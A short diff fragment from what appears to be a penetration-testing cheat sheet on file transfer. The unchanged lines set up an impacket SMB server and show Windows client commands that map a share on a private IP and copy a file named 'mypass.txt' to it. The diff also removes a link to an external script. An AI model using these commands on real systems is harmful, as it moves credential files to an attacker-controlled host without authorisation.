@@ -10,7 +10,4 @@ functions:
   		+++++++++++SMB+++++++++++
         SERVER: impacket-smbserver "share" . -smb2support
         CLIENT: (1) net use \\192.168.119.159\share   (2)  copy "mypass.txt" \\192.168.119.159\share\
-resources: |
-  https://raw.githubusercontent.com/MidnightSeer/scripts/master/wget-windows
-
 ---
